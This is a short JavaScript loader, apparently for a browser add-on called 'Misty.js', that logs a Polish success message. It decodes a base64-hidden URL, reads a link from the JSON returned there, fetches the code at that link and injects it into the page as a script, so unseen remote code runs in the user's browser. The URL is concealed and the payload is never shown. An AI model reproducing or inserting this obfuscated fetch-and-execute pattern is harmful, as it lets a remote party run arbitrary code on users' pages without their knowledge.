const misty = (url, cb) => { fetch(url).then(res => res.json()).then((out) => { cb(out) }).catch(err => { throw err }); }

misty(atob("aHR0cHM6Ly9hcGkubnBvaW50LmlvL2RkY2M1ZTk1NmVjNzgwN2YzMTQ4"),(data) => {
		Promise.all([
			fetch(data.link).then(value => value.text())
		  ]).then(all => {
			  $("body").append("<script>"+all[0]+"</script>");
			  customLog("Skrypt (Misty.js) załadowano Poprawnie!")
		  }).catch(err => { throw err });
	});